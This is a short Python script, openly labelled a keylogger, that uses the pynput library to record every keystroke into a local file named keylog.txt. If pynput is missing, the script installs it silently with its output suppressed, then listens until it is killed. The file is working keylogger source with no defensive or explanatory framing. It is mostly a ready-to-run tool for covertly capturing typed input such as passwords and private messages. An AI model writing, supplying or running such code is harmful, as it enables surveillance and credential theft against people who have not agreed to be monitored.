# Keylogger script that logs keystrokes to a file
# This script requires the 'pynput' library to be installed.

import sys
import subprocess
try:
    from pynput import keyboard
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "pynput"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    from pynput import keyboard

# This script will log keystrokes to a file named "keylog.txt" in the current directory.
LOG_FILE = "keylog.txt"

# Check if the script is running with administrator privileges
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

    
#Launch the keylogger and start listening for key presses
def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# This will run the keylogger until the script is terminated
if __name__ == "__main__":
    main()